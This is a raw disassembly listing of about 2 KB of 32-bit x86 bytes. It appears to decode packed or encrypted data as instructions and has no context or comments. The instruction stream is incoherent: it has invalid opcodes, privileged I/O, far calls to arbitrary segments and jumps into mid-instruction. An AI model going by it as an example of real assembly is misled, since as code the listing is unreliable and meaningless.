  41fd3e:	mov    ecx,0x1a8f35f7
  41fd43:	fstp   TBYTE PTR ds:[ebx+0x448e47bf]
  41fd4a:	test   DWORD PTR [esi],ebp
  41fd4c:	jne    0x41fd10
  41fd4e:	adc    al,0x6
  41fd50:	lds    esi,FWORD PTR [ecx+0xb6a6d77]
  41fd56:	add    al,0xe1
  41fd58:	loopne 0x41fd2f
  41fd5a:	ins    BYTE PTR es:[edi],dx
  41fd5b:	inc    edx
  41fd5c:	mov    BYTE PTR [eax+ebp*8-0x3a1f94f3],bh
  41fd63:	addr16 pop esi
  41fd65:	or     al,0x23
  41fd67:	fbstp  TBYTE PTR [edx]
  41fd69:	aad    0x27
  41fd6b:	jnp    0x41fcf3
  41fd6d:	xlat   BYTE PTR ds:[ebx]
  41fd6e:	outs   dx,BYTE PTR ds:[esi]
  41fd6f:	jle    0x41fd4b
  41fd71:	adc    eax,0xa71d389
  41fd76:	repnz mov esi,0x9c8afbe
  41fd7c:	enter  0xaaa0,0xc9
  41fd80:	mov    bl,0xd4
  41fd82:	sbb    BYTE PTR ds:0xc004b920,al
  41fd88:	or     ah,BYTE PTR [edi+0x5d798a67]
  41fd8e:	int3   
  41fd8f:	add    bh,0x57
  41fd92:	arpl   WORD PTR [edi-0x69],si
  41fd95:	mov    dl,0x59
  41fd97:	aam    0xc6
  41fd99:	mov    al,ds:0xe792ea94
  41fd9e:	or     DWORD PTR [ebp+ebp*1-0x25d7d2a1],eax
  41fda5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fda6:	push   cs
  41fda7:	neg    DWORD PTR [eax+0x60]
  41fdaa:	pop    ebp
  41fdab:	test   eax,0xc0f30434
  41fdb0:	or     al,0x8a
  41fdb2:	mov    dh,0x94
  41fdb4:	inc    ebx
  41fdb5:	jb     0x41fd67
  41fdb7:	retf   0x2f6c
  41fdba:	cmp    eax,0x4bd776dd
  41fdbf:	(bad)  
  41fdc0:	imul   ebx,DWORD PTR [edx],0x3
  41fdc3:	cs pop edi
  41fdc5:	pop    ebx
  41fdc6:	push   0xa
  41fdc8:	mov    ecx,0x1abe6c13
  41fdcd:	adc    ebp,eax
  41fdcf:	nop
  41fdd0:	(bad)  
  41fdd1:	test   eax,0xa632f99
  41fdd6:	cli    
  41fdd7:	ret    
  41fdd8:	cwde   
  41fdd9:	dec    ebp
  41fdda:	dec    edi
  41fddb:	rol    BYTE PTR [esi],cl
  41fddd:	nop
  41fdde:	into   
  41fddf:	jae    0x41fe3b
  41fde1:	scas   eax,DWORD PTR es:[edi]
  41fde2:	ss es pop ebp
  41fde5:	loope  0x41fe60
  41fde7:	add    dh,BYTE PTR [esi+0x1e]
  41fdea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fdeb:	sub    al,0x7
  41fded:	(bad)  
  41fdee:	cmp    eax,0xa64a23b2
  41fdf3:	imul   edx,DWORD PTR [ecx],0x47
  41fdf6:	popa   
  41fdf7:	aam    0x38
  41fdf9:	jae    0x41fde6
  41fdfb:	test   al,0xc
  41fdfd:	(bad)  
  41fdfe:	cmp    BYTE PTR [edi+0x4b],dl
  41fe01:	pop    ebp
  41fe02:	add    DWORD PTR [ebx-0xcd4d2ca],edi
  41fe08:	cmc    
  41fe09:	or     ebp,edi
  41fe0b:	pop    es
  41fe0c:	loopne 0x41fe33
  41fe0e:	and    BYTE PTR [esp+eax*2-0x7c],ah
  41fe12:	mov    al,0xcb
  41fe14:	or     esi,DWORD PTR [ebx]
  41fe16:	lods   al,BYTE PTR ds:[esi]
  41fe17:	push   esi
  41fe18:	call   0xfeb3:0x86879f7f
  41fe1f:	jo     0x41fe57
  41fe21:	call   0xf2e4:0x5a6aed60
  41fe28:	outs   dx,DWORD PTR ds:[esi]
  41fe29:	jo     0x41fea1
  41fe2b:	mov    ah,0x89
  41fe2d:	pop    ss
  41fe2e:	inc    esi
  41fe2f:	in     eax,0x44
  41fe31:	mov    esi,ebp
  41fe33:	mov    ch,0xa4
  41fe35:	mov    dh,BYTE PTR ds:0x92ad949d
  41fe3b:	addr16 jnp 0x41fe3e
  41fe3e:	mov    dh,0xb1
  41fe40:	push   ss
  41fe41:	jno    0x41fddb
  41fe43:	popa   
  41fe44:	dec    esp
  41fe45:	inc    edi
  41fe46:	in     al,0x10
  41fe48:	hlt    
  41fe49:	std    
  41fe4a:	sub    eax,0x57fbbb60
  41fe4f:	fld    QWORD PTR [ebp+0x5f]
  41fe52:	fdiv   st,st(7)
  41fe54:	call   0x729e:0x9ce86555
  41fe5b:	test   BYTE PTR [ebp+0x56],dl
  41fe5e:	jle    0x41fe61
  41fe60:	jns    0x41fe47
  41fe62:	das    
  41fe63:	add    esp,ebx
  41fe65:	inc    DWORD PTR [ebp+0x25f5eb33]
  41fe6b:	push   0x0
  41fe6d:	das    
  41fe6e:	out    dx,eax
  41fe6f:	test   BYTE PTR ds:0x1934c92d,al
  41fe75:	stc    
  41fe76:	jl     0x41fec0
  41fe78:	out    0x97,eax
  41fe7a:	dec    ebp
  41fe7b:	adc    al,BYTE PTR [ebp+0x42c80d12]
  41fe81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe82:	cmp    al,al
  41fe84:	loope  0x41fe6f
  41fe86:	dec    eax
  41fe87:	xor    edx,DWORD PTR [edi+esi*4+0x5e7d70c3]
  41fe8e:	mov    dl,0xe9
  41fe90:	outs   dx,DWORD PTR ds:[esi]
  41fe91:	push   edi
  41fe92:	pop    esp
  41fe93:	mov    esi,0xb1d3089d
  41fe98:	iret   
  41fe99:	add    BYTE PTR [eax-0xf],ah
  41fe9c:	retf   0xc257
  41fe9f:	inc    ebx
  41fea0:	or     BYTE PTR [edi+edx*8],bl
  41fea3:	cmp    eax,0x96740bff
  41fea8:	xchg   ebp,esi
  41feaa:	adc    eax,0xae131d93
  41feaf:	repnz in eax,0xa5
  41feb2:	cmp    dl,BYTE PTR [esi+0x32]
  41feb5:	shl    BYTE PTR [ebp+0x2834],cl
  41febb:	add    BYTE PTR [ecx-0x6b36a2],ch
  41fec1:	xchg   edi,eax
  41fec2:	std    
  41fec3:	jg     0x41fecf
  41fec5:	in     al,0x99
  41fec7:	pop    ecx
  41fec8:	ja     0x41fe52
  41feca:	jnp    0x41fe98
  41fecc:	sub    bh,BYTE PTR [ebx+0x1]
  41fecf:	add    BYTE PTR [ebp+0x74000002],al
  41fed5:	in     al,dx
  41fed6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fed7:	in     eax,0x9b
  41fed9:	mov    cl,0x10
  41fedb:	push   ebp
  41fedc:	dec    ecx
  41fedd:	sbb    eax,0xa450460d
  41fee2:	call   0xff4d:0x2445c2d3
  41fee9:	sub    bl,BYTE PTR [ebx]
  41feeb:	dec    ebp
  41feec:	fbstp  TBYTE PTR [esi]
  41feee:	in     eax,dx
  41feef:	fistp  DWORD PTR [eax-0x678329a3]
  41fef5:	mov    edx,DWORD PTR [esi]
  41fef7:	fwait
  41fef8:	push   esi
  41fef9:	mov    edi,0x725a343a
  41fefe:	jo     0x41fef8
  41ff00:	clc    
  41ff01:	dec    esi
  41ff02:	adc    DWORD PTR ds:0xe2465a11,0x6f39b5ff
  41ff0c:	sbb    esi,DWORD PTR [edi+0x56ece58f]
  41ff12:	bound  ebp,QWORD PTR [edi+eiz*2+0x4f]
  41ff16:	pop    eax
  41ff17:	adc    ecx,ecx
  41ff19:	sub    DWORD PTR [ecx+eax*8-0x60],ebp
  41ff1d:	mov    eax,ds:0xa41cd80b
  41ff22:	mov    cl,0xd2
  41ff24:	scas   eax,DWORD PTR es:[edi]
  41ff25:	jmp    0x41ff0c
  41ff27:	(bad)  
  41ff28:	sbb    eax,0x7cd7d270
  41ff2d:	cmp    ah,BYTE PTR [esi]
  41ff2f:	or     al,0x15
  41ff31:	mov    dl,0x8
  41ff33:	shr    eax,1
  41ff35:	mov    dh,al
  41ff37:	jnp    0x41fec5
  41ff39:	and    edi,DWORD PTR [ecx]
  41ff3b:	jmp    0x41ff21
  41ff3d:	sar    bh,0xfb
  41ff40:	xor    DWORD PTR [ecx],ecx
  41ff42:	(bad)  
  41ff43:	fcomp  DWORD PTR [esi-0x68]
  41ff46:	mov    eax,0x65aef2b2
  41ff4b:	xor    al,0x9c
  41ff4d:	inc    ebp
  41ff4e:	mov    esi,0x1ae444d4
  41ff53:	push   edx
  41ff54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff55:	ret    
  41ff56:	adc    al,0xb3
  41ff58:	jne    0x41ff25
  41ff5a:	enter  0x3ab9,0xef
  41ff5e:	stos   DWORD PTR es:[edi],eax
  41ff5f:	mov    ds:0xfb9ab90b,eax
  41ff64:	adc    BYTE PTR [edi-0x53],bl
  41ff67:	call   DWORD PTR [eax+0x30dbbc3]
  41ff6d:	xchg   ebx,eax
  41ff6e:	dec    ebp
  41ff6f:	mov    dl,0xcb
  41ff71:	jbe    0x41ff93
  41ff73:	add    BYTE PTR [eax],dh
  41ff75:	xlat   BYTE PTR ds:[ebx]
  41ff76:	fild   WORD PTR ds:0x911c4a50
  41ff7c:	or     BYTE PTR [ebp+0x24],0xa3
  41ff80:	inc    esp
  41ff81:	imul   ecx,DWORD PTR [edi-0x5d],0x3e
  41ff85:	ja     0x41ff0c
  41ff87:	je     0x41ff78
  41ff89:	fidivr DWORD PTR [eax+eiz*2]
  41ff8c:	std    
  41ff8d:	aad    0x40
  41ff8f:	add    al,0x68
  41ff91:	and    DWORD PTR [esi],edx
  41ff93:	add    dh,BYTE PTR [edx+0x7c1c94da]
  41ff99:	dec    esi
  41ff9a:	sbb    eax,0xc9b4b590
  41ff9f:	outs   dx,BYTE PTR ds:[esi]
  41ffa0:	ret    0xc91e
  41ffa3:	jns    0x420017
  41ffa5:	mov    esi,0x34e5c75b
  41ffaa:	sub    eax,0x2a4debde
  41ffaf:	ss adc al,0x90
  41ffb2:	lods   eax,DWORD PTR ds:[esi]
  41ffb3:	push   edi
  41ffb4:	pop    ecx
  41ffb5:	repz cs call 0x178f5033
  41ffbc:	jae    0x41fff3
  41ffbe:	mov    ecx,0x1d5e152b
  41ffc3:	(bad)  
  41ffc4:	push   esi
  41ffc5:	xchg   ebp,eax
  41ffc6:	pop    WORD PTR [eax]
  41ffc9:	push   ecx
  41ffca:	adc    bh,bl
  41ffcc:	and    DWORD PTR [edi+0x58],eax
  41ffcf:	imul   esi,DWORD PTR [ebx+0x6b94a4be],0x7a
  41ffd6:	out    0x72,eax
  41ffd8:	pop    ecx
  41ffd9:	loop   0x41ffd3
  41ffdb:	ds mov ebx,0xf1fd0dd5
  41ffe1:	ret    0xb7e9
  41ffe4:	repnz sub al,0x18
  41ffe7:	inc    edi
  41ffe8:	imul   esp,eax,0xc4092557
  41ffee:	mul    ecx
  41fff0:	cmp    ebx,esp
  41fff2:	in     eax,0x24
  41fff4:	(bad)  
  41fff5:	cmp    al,0x4d
  41fff7:	inc    esi
  41fff8:	inc    ebp
  41fff9:	call   0x3757:0x6bd9ea6b
  420000:	mov    al,ds:0xe19a1551
  420005:	jns    0x420066
  420007:	stos   DWORD PTR es:[edi],eax
  420008:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420009:	fadd   DWORD PTR [edi]
  42000b:	sbb    DWORD PTR [ebx],eax
  42000d:	inc    edi
  42000e:	cdq    
  42000f:	and    DWORD PTR [edx],esi
  420011:	push   ds
  420012:	repz stc 
  420014:	xchg   ebx,eax
  420015:	or     dh,BYTE PTR [ecx+0x39]
  420018:	adc    DWORD PTR [edx-0x47],ebp
  42001b:	daa    
  42001c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42001d:	jmp    0x42007e
  42001f:	ret    0x5ac0
  420022:	outs   dx,BYTE PTR ds:[si]
  420024:	or     al,0x87
  420026:	leave  
  420027:	cmp    dh,BYTE PTR [edx*2+0x10aec28f]
  42002e:	and    DWORD PTR [esi],ebp
  420030:	(bad)  
  420031:	aaa    
  420032:	ficom  WORD PTR [ebx+0x7c]
  420035:	adc    cl,BYTE PTR [edi]
  420037:	cwde   
  420038:	adc    DWORD PTR [edx+0x64],esi
  42003b:	adc    al,0x3f
  42003d:	adc    DWORD PTR [ecx],0xf7a1ef62
  420043:	mov    ebx,0x1742e449
  420048:	fucom  st(0)
  42004a:	lahf   
  42004b:	retf   0xeb41
  42004e:	xchg   ebp,eax
  42004f:	xor    esp,DWORD PTR [esi-0x23]
  420052:	dec    ecx
  420053:	jb     0x41fff7
  420055:	(bad)  
  420056:	retf   
  420057:	jl     0x4200a1
  420059:	pop    es
  42005a:	cmp    edx,0x188efd6f
  420060:	dec    edi
  420061:	pusha  
  420062:	mov    dl,0x33
  420064:	(bad)  
  420065:	out    dx,eax
  420066:	test   DWORD PTR [ebp-0x10433b37],0x35222f51
  420070:	fst    DWORD PTR [esi-0x30]
  420073:	je     0x42000d
  420075:	dec    ecx
  420076:	iret   
  420077:	inc    esp
  420078:	mov    edx,0xeeebabbf
  42007d:	push   ds
  42007e:	in     eax,dx
  42007f:	mov    DWORD PTR [ecx-0x6b026591],esi
  420085:	test   BYTE PTR [ebx-0x51],bl
  420088:	bound  ecx,QWORD PTR [edx+0x67444b9e]
  42008e:	sti    
  42008f:	sub    BYTE PTR [ebx+0x6f],cl
  420092:	call   FWORD PTR [esi]
  420094:	(bad)  
  420096:	push   edi
  420097:	jmp    0x420096
  420099:	mov    ah,0x36
  42009b:	jecxz  0x4200b1
  42009d:	inc    ebp
  42009e:	jp     0x420037
  4200a0:	xor    dl,BYTE PTR [esi-0x2deee4c1]
  4200a6:	sbb    al,0x7f
  4200a8:	fnsave [edx-0x42]
  4200ab:	and    eax,0x8a2276c8
  4200b0:	xchg   ecx,eax
  4200b1:	repnz inc esp
  4200b3:	test   BYTE PTR [eax+eax*2],dl
  4200b6:	add    ch,dl
  4200b8:	les    ebp,FWORD PTR [ecx]
  4200ba:	jl     0x420063
  4200bc:	inc    bh
  4200be:	push   ds
  4200bf:	retf   
  4200c0:	lds    edi,FWORD PTR [eax+eiz*2-0x4b]
  4200c4:	xor    BYTE PTR [ecx],dh
  4200c6:	sub    ebp,edi
  4200c8:	ja     0x4200a1
  4200ca:	pop    esp
  4200cb:	push   edx
  4200cc:	xor    al,0x9d
  4200ce:	test   ah,dl
  4200d0:	arpl   WORD PTR [eax+edi*2+0x18cf29db],di
  4200d7:	not    DWORD PTR [edi]
  4200d9:	jle    0x420084
  4200db:	pop    ss
  4200dc:	ins    DWORD PTR es:[edi],dx
  4200dd:	xchg   edi,eax
  4200de:	outs   dx,DWORD PTR ds:[esi]
  4200df:	xchg   DWORD PTR [ecx+0x9],eax
  4200e2:	jns    0x420069
  4200e4:	pop    edx
  4200e5:	mov    esp,0x227a199e
  4200ea:	xchg   ebx,eax
  4200eb:	iret   
  4200ec:	cld    
  4200ed:	loopne 0x4200bf
  4200ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4200f0:	jle    0x4200a7
  4200f2:	lods   al,BYTE PTR ds:[esi]
  4200f3:	es out 0x23,eax
  4200f6:	cld    
  4200f7:	lds    ebp,FWORD PTR [ebp-0x18]
  4200fa:	nop
  4200fb:	cdq    
  4200fc:	test   al,0x89
  4200fe:	jns    0x4200f4
  420100:	sub    al,0x79
  420102:	sub    DWORD PTR [ecx],edi
  420104:	inc    ebx
  420105:	dec    edi
  420106:	push   edx
  420107:	retf   0xa1ba
  42010a:	cld    
  42010b:	xlat   BYTE PTR ds:[ebx]
  42010c:	lods   eax,DWORD PTR ds:[esi]
  42010d:	loop   0x420118
  42010f:	fadd   DWORD PTR [ebp-0x5e25fa99]
  420115:	in     eax,0x32
  420117:	push   ecx
  420118:	mov    ds:0x3c8ce187,eax
  42011d:	popf   
  42011e:	test   ah,al
  420120:	cli    
  420121:	cmp    ebx,esp
  420123:	sbb    eax,0xa13d7ba3
  420128:	sbb    eax,DWORD PTR [ebx-0x26de0a43]
  42012e:	pop    edx
  42012f:	mov    al,BYTE PTR [ebx]
  420131:	push   edi
  420132:	or     eax,0x9439a95e
  420137:	std    
  420138:	cmp    BYTE PTR [edx-0x46],al
  42013b:	shr    DWORD PTR [eax+0x76],0x5f
  42013f:	leave  
  420140:	je     0x4200fa
  420142:	mov    edx,0x4ccdf715
  420147:	sub    DWORD PTR [ebx+0x13],esp
  42014a:	jb     0x4200ee
  42014c:	push   eax
  42014d:	ja     0x420101
  42014f:	cld    
  420150:	cmp    BYTE PTR [ecx-0x2d095cfb],ch
  420156:	enter  0xb79d,0x0
  42015a:	add    BYTE PTR [eax],al
  42015c:	mov    ebx,0x7d7539cf
  420161:	idiv   edi
  420163:	iret   
  420164:	std    
  420165:	mov    ecx,DWORD PTR [esi-0x195069f1]
  42016b:	xchg   esi,eax
  42016c:	scas   eax,DWORD PTR es:[edi]
  42016d:	jge    0x420170
  42016f:	add    BYTE PTR [ebp-0x3bfffffe],al
  420175:	xchg   edi,eax
  420176:	(bad)  
  420177:	mov    ds:0x269e9d9,al
  42017c:	shl    BYTE PTR ds:0x44a31160,cl
  420182:	jp     0x420164
  420184:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420185:	fwait
  420186:	(bad)  
  420187:	pop    ss
  420188:	inc    edx
  420189:	dec    ebx
  42018a:	inc    esp
  42018b:	hlt    
  42018c:	into   
  42018d:	mov    bp,0x456e
  420191:	push   ss
  420192:	pop    ebx
  420193:	in     eax,0x1c
  420195:	fcomip st,st(7)
  420197:	dec    edx
  420198:	dec    ebp
  420199:	inc    edx
  42019a:	add    BYTE PTR [ecx+0x670d69d],ah
  4201a0:	in     al,0x32
  4201a2:	daa    
  4201a3:	cmp    al,0xfa
  4201a5:	mov    eax,eax
  4201a7:	in     al,0x26
  4201a9:	daa    
  4201aa:	adc    eax,DWORD PTR [eax-0xaae8a66]
  4201b0:	xchg   ebx,eax
  4201b1:	(bad)  
  4201b2:	jmp    0x4201dd
  4201b4:	es cli 
  4201b6:	add    DWORD PTR [edi+ebp*4+0x2ac30aa7],ebp
  4201bd:	sub    dl,0xb5
  4201c0:	(bad)  
  4201c2:	jnp    0x4201fe
  4201c4:	push   es
  4201c5:	push   ecx
  4201c6:	outs   dx,BYTE PTR ds:[esi]
  4201c7:	sub    eax,0x83a93d5c
  4201cc:	jge    0x42017a
  4201ce:	leave  
  4201cf:	inc    edi
  4201d0:	fnstcw WORD PTR [ebx+0x258e8cbe]
  4201d6:	push   cs
  4201d7:	sahf   
  4201d8:	dec    esp
  4201d9:	outs   dx,BYTE PTR ds:[esi]
  4201da:	lds    edi,FWORD PTR [eax]
  4201dc:	out    dx,eax
  4201dd:	xchg   edx,eax
  4201de:	xchg   edi,eax
  4201df:	pop    es
  4201e0:	shl    DWORD PTR [ecx-0x178350fe],0xf1
  4201e7:	sahf   
  4201e8:	pop    edx
  4201e9:	pop    esp
  4201ea:	mov    ah,BYTE PTR [ebx+0x14]
  4201ed:	jne    0x4201e1
  4201ef:	(bad)  
  4201f0:	or     BYTE PTR [ebx+ecx*1+0x5adcfe34],cl
  4201f7:	loope  0x42023d
  4201f9:	add    al,0x8e
  4201fb:	test   BYTE PTR [ecx-0x4696a7d4],cl
  420201:	out    0x27,al
  420203:	leave  
  420204:	inc    ebp
  420205:	fbld   TBYTE PTR [edx-0x70]
  420208:	cmp    ebx,DWORD PTR [edx]
  42020a:	mov    ch,0x97
  42020c:	lea    ebx,[edi-0x5cfc9e34]
  420212:	outs   dx,BYTE PTR ds:[esi]
  420213:	jle    0x420226
  420215:	pop    ss
  420216:	mov    ecx,ss
  420218:	fldcw  WORD PTR [edx]
  42021a:	dec    ecx
  42021b:	(bad)  
  42021c:	dec    esp
  42021d:	outs   dx,BYTE PTR ds:[esi]
  42021e:	and    BYTE PTR [ecx+eax*1-0x65],dh
  420222:	clc    
  420223:	or     dh,BYTE PTR [eax+0x64]
  420226:	xchg   edi,eax
  420227:	leave  
  420228:	cld    
  420229:	jmp    0x420261
  42022b:	pop    ebp
  42022c:	add    eax,DWORD PTR [eax]
  42022e:	mov    al,ds:0xfdd1baf8
  420233:	inc    esi
  420234:	inc    edi
  420235:	and    eax,0x9d00f0a9
  42023a:	dec    eax
  42023b:	into   
  42023c:	and    edi,DWORD PTR [eax]
  42023e:	fcom   DWORD PTR [edx+0x2a]
  420241:	push   ebp
  420242:	call   0x7990e183
  420247:	sahf   
  420248:	sub    al,0xb1
  42024a:	mov    ecx,0x575e33e8
  42024f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420250:	or     esp,esp
  420252:	imul   esi,DWORD PTR [esi],0x4e
  420255:	and    ebx,esp
  420257:	pop    ss
  420258:	jno    0x42021b
  42025a:	inc    ebp
  42025b:	push   0xcc1435c7
  420260:	dec    edi
  420261:	xor    DWORD PTR [edi+0x4ce86817],0x4c
  420268:	adc    eax,0xabaa044f
  42026d:	lahf   
  42026e:	mov    gs,eax
  420270:	inc    esp
  420271:	mov    esi,0xd749a158
  420276:	pop    ds
  420277:	mov    esi,0x927e8bc9
  42027c:	or     eax,DWORD PTR [ebx]
  42027e:	loope  0x42022e
  420280:	shr    DWORD PTR [edx-0x6ea81586],cl
  420286:	idiv   DWORD PTR [ebx]
  420288:	icebp  
  420289:	pop    edx
  42028a:	push   ds
  42028b:	lahf   
  42028c:	mov    ds:0x4f34b45b,al
  420291:	imul   esp,DWORD PTR [edx-0x6c945c73],0x5b
  420298:	mov    ebx,0xc49ca464
  42029d:	and    BYTE PTR [esi],cl
  42029f:	sbb    ecx,eax
  4202a1:	jo     0x420258
  4202a3:	jno    0x420261
  4202a5:	and    eax,0x2858c05b
  4202aa:	ins    BYTE PTR es:[edi],dx
  4202ab:	mov    edx,0x48c6123e
  4202b0:	mov    esp,0x7b60a28
  4202b5:	inc    ebp
  4202b6:	xchg   ebx,eax
  4202b7:	xor    ah,bl
  4202b9:	out    0xd9,al
  4202bb:	outs   dx,BYTE PTR ds:[esi]
  4202bc:	mov    ebp,0x3353cfc4
  4202c1:	dec    ebx
  4202c2:	push   esi
  4202c3:	dec    edx
  4202c4:	sub    BYTE PTR [ebx+0x1c],ch
  4202c7:	or     DWORD PTR [edi],edi
  4202c9:	mov    dh,0x97
  4202cb:	lock xchg esp,eax
  4202ce:	imul   ebx,ebx,0x26c9f5c1
  4202d4:	dec    edx
  4202d5:	xor    esp,DWORD PTR [eax+ecx*8+0x73]
  4202d9:	adc    eax,0x2fbd9d07
  4202de:	pop    eax
  4202df:	mov    cl,0x5a
  4202e1:	add    dh,cl
  4202e3:	push   0x70
  4202e5:	clc    
  4202e6:	mov    eax,ds:0xa95a12f1
  4202eb:	mov    esi,0x1f569c54
  4202f0:	jno    0x4202e4
  4202f2:	lds    edx,FWORD PTR [edx+0x46]
  4202f5:	mov    ch,0x3a
  4202f7:	xor    BYTE PTR [ebx+0x10],ch
  4202fa:	jnp    0x4202a9
  4202fc:	mov    al,0xf5
  4202fe:	and    al,0xd6
  420300:	pushf  
  420301:	and    eax,0x18ec622b
  420306:	or     DWORD PTR [edi-0x16f82d2e],ebp
  42030c:	(bad)  
  42030e:	xchg   ecx,eax
  42030f:	enter  0x69ad,0x53
  420313:	mov    dh,0x3b
  420315:	imul   ecx,DWORD PTR [edx-0x2b],0xffffffbd
  420319:	ins    DWORD PTR es:[edi],dx
  42031a:	dec    ecx
  42031b:	xchg   edx,eax
  42031c:	dec    esp
  42031d:	xor    ecx,DWORD PTR [eax+0x1a]
  420320:	loop   0x4202bf
  420322:	out    dx,al
  420323:	inc    DWORD PTR [esi-0x3331cd07]
  420329:	pcmpeqd mm3,QWORD PTR [edx]
  42032c:	call   0x9081:0xf27ca706
  420333:	pop    ebp
  420334:	mov    dl,0x88
  420336:	push   ss
  420337:	or     eax,0x1caf47de
  42033c:	dec    esi
  42033d:	lds    ebp,FWORD PTR [eax]
  42033f:	dec    ebp
  420340:	jge    0x420327
  420342:	push   0xffffffc8
  420344:	(bad)  
  420345:	mov    fs,WORD PTR [ecx]
  420347:	fsubr  DWORD PTR [esp+edi*1+0x74fbe3ea]
  42034e:	je     0x4203bb
  420350:	nop
  420351:	mov    al,0x10
  420353:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420354:	push   0x37
  420356:	rcl    DWORD PTR [edi-0x7eff6e8a],1
  42035c:	push   0xffffff93
  42035e:	sub    eax,0x5c78b0f7
  420363:	in     eax,dx
  420364:	mov    ch,0xe5
  420366:	cmp    ch,BYTE PTR ds:0xc54cd017
  42036c:	push   es
  42036d:	sub    BYTE PTR [esi],ch
  42036f:	fucom  st(6)
  420371:	mov    ds:0x27832ddf,al
  420376:	loopne 0x4203e5
  420378:	xor    BYTE PTR [ecx-0x12316904],0xcf
  42037f:	data16 sub bh,BYTE PTR [eax-0x67]
  420383:	jg     0x420400
  420385:	call   0x98bf:0x16d588cd
  42038c:	(bad)  
  42038d:	xchg   ecx,eax
  42038e:	ins    BYTE PTR es:[edi],dx
  42038f:	cmp    dh,dh
  420391:	popf   
  420392:	js     0x42034f
  420394:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420395:	aam    0xca
  420397:	mov    eax,ds:0xf5bdc1ad
  42039c:	gs ret 0x3a21
  4203a0:	fldcw  WORD PTR [ecx-0x75]
  4203a3:	cmp    eax,0xc71ac341
  4203a8:	pop    ecx
  4203a9:	mov    ecx,0xeb4e6023
  4203ae:	mov    dh,0xa4
  4203b0:	(bad)  
  4203b2:	rol    DWORD PTR [ebp-0x24],cl
  4203b5:	aaa    
  4203b6:	dec    edx
  4203b7:	mov    WORD PTR [ebx],?
  4203b9:	mov    eax,0x6dbb491
  4203be:	or     edi,DWORD PTR [ecx+0x54]
  4203c1:	lock xchg ecx,eax
  4203c3:	fwait
  4203c4:	lods   al,BYTE PTR ds:[esi]
  4203c5:	arpl   WORD PTR ds:0x83f9dc1,ax
  4203cb:	sub    BYTE PTR [eax-0x73],0xe6
  4203cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203d0:	fld    TBYTE PTR [edx]
  4203d2:	dec    esp
  4203d3:	xchg   esp,eax
  4203d4:	loop   0x420435
  4203d6:	mov    ecx,ss
  4203d8:	xchg   edx,eax
  4203d9:	mov    al,0x19
  4203db:	xchg   esi,eax
  4203dc:	and    al,BYTE PTR [ebx]
  4203de:	and    DWORD PTR [esi],esi
  4203e0:	sbb    al,0x20
  4203e2:	push   eax
  4203e3:	dec    eax
  4203e4:	cmp    dh,BYTE PTR ds:0x790c
  4203e9:	arpl   sp,bx
  4203eb:	retf   0x3eb0
  4203ee:	stos   BYTE PTR es:[edi],al
  4203ef:	jmp    0x4203dc
  4203f1:	push   ecx
  4203f2:	adc    DWORD PTR [ebp-0x74],esp
  4203f5:	cs adc al,0x9a
  4203f8:	and    BYTE PTR [eax],al
  4203fa:	add    BYTE PTR [eax],al
  4203fc:	out    dx,al
  4203fd:	ret    0x2d9d
  420400:	mov    ebp,0x3fc3fe7f
  420405:	out    dx,eax
  420406:	mov    edi,0x1d7a7037
  42040b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42040c:	xor    al,0x80
  42040e:	add    DWORD PTR [eax],eax
  420410:	test   DWORD PTR [edx],eax
  420412:	add    BYTE PTR [eax],al
  420414:	sbb    ecx,edx
  420416:	sub    al,0xeb
  420418:	dec    ecx
  420419:	xchg   ecx,eax
  42041a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42041b:	mov    edi,0xc06f1d7f
  420420:	push   edi
  420421:	inc    edi
  420422:	test   al,0x97
  420424:	cmp    eax,DWORD PTR [esi]
  420426:	add    DWORD PTR [edi],esp
  420428:	imul   eax,DWORD PTR [edi],0x3d49b151
  42042e:	int    0x8b
  420430:	fldcw  WORD PTR [esi+eax*1+0x3d08665d]
  420437:	aam    0x32
  420439:	lods   al,BYTE PTR ds:[esi]
  42043a:	retf   0xba1a
  42043d:	inc    esi
  42043e:	in     al,dx
  42043f:	sbb    eax,0xfeedd634
  420444:	pop    esp
  420445:	sbb    al,0x18
  420447:	sub    edx,DWORD PTR [ecx-0x7f1dbdb3]
  42044d:	xchg   edx,eax
  42044e:	mov    eax,ss
  420450:	pop    edi
  420451:	fld    DWORD PTR [ebx+0x6b8304b7]
  420457:	or     eax,0xe1516ee1
  42045c:	add    BYTE PTR [ebx+0x7e],cl
  42045f:	jnp    0x42046e
  420461:	into   
  420462:	inc    ecx
  420463:	pop    ds
  420464:	sub    BYTE PTR [edi+0x5092d900],0x70
  42046b:	cmc    
  42046c:	cmp    dl,BYTE PTR [esi+edi*1]
  42046f:	stos   DWORD PTR es:[edi],eax
  420470:	cdq    
  420471:	lahf   
  420472:	cmp    BYTE PTR [esi+edi*1],al
  420475:	add    DWORD PTR [edi-0x4a],ecx
  420478:	rcr    DWORD PTR [edi-0x1e],cl
  42047b:	mov    eax,ds:0x9bb5df79
  420480:	mov    ah,0x33
  420482:	cmp    edi,ecx
  420484:	outs   dx,BYTE PTR ds:[esi]
  420485:	mov    esp,0xec7c6f03
  42048a:	int    0x3f
  42048c:	rcl    ebx,cl
  42048e:	jno    0x4204b8
  420490:	mov    ah,0xbc
  420492:	adc    al,0xc6
  420494:	enterw 0xee34,0x41
  420499:	inc    ecx
  42049a:	aas    
  42049b:	add    BYTE PTR [eax-0x6ab9c42],al
  4204a1:	js     0x420480
  4204a3:	(bad)  
  4204a4:	sbb    BYTE PTR [edx+0x67128f24],0x55
  4204ab:	push   esp
  4204ac:	jmp    0xafc45c21
  4204b1:	mov    edi,0x86a9ab21
  4204b6:	imul   esi
  4204b8:	adc    eax,edi
  4204ba:	(bad)  
  4204bc:	bound  ecx,QWORD PTR [esi]
  4204be:	mov    bl,0x24
